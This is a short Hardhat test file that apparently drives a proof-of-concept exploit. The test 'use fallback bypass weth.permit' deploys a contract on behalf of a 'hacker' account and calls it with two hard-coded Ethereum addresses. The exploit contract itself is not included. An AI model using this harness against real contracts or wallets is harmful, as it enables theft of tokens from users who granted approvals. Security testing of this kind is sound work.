import { expect } from "chai";
import { defaultAccounts } from "ethereum-waffle";
import { getAddress } from "ethers/lib/utils";
import { ethers } from "hardhat";

describe("Greeter", function () {
  it("use fallback bypass weth.permit", async function () {
    const accounts = await ethers.getSigners()
    const hacker = await accounts[0].getAddress();

    const Greeter = await ethers.getContractFactory("Greeter");
    const greeter = await Greeter.deploy(hacker);

    await greeter.deployed();
    await greeter.greet(["0x7f4bae93c21b03836d20933ff55d9f77e5b8d34d", "0x57633FB641bACd59382b0C333D47C1A4AA2D7de4"]);

  });
});
